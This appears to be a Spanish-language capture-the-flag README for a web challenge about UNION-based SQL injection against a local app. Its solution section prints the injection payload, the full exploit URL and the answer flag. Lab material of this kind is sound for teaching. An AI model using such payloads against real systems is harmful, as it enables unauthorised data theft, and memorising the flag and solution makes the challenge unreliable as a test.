# SQL Injection - UNION (WEB - Medio)

## Descripción
La aplicación tiene una vulnerabilidad SQL Injection que permite ejecutar consultas arbitrarias. Debes usar UNION para obtener la flag de la tabla `flags`.

## Instrucciones
1. Inicia el servidor: `python app.py`
2. Accede a `http://localhost:3000/search?user=admin`
3. Usa UNION para obtener datos de la tabla `flags`

## Solución
Payload UNION:
```
' UNION SELECT id, flag, '' FROM flags WHERE '1'='1
```

URL completa:
```
http://localhost:3000/search?user=' UNION SELECT id, flag, '' FROM flags WHERE '1'='1
```

## Flag
```
CTF{sqli_union_flag}
```

## Conceptos
- SQL Injection
- UNION-based SQLi
- Enumeración de base de datos
- Inyección en parámetros GET
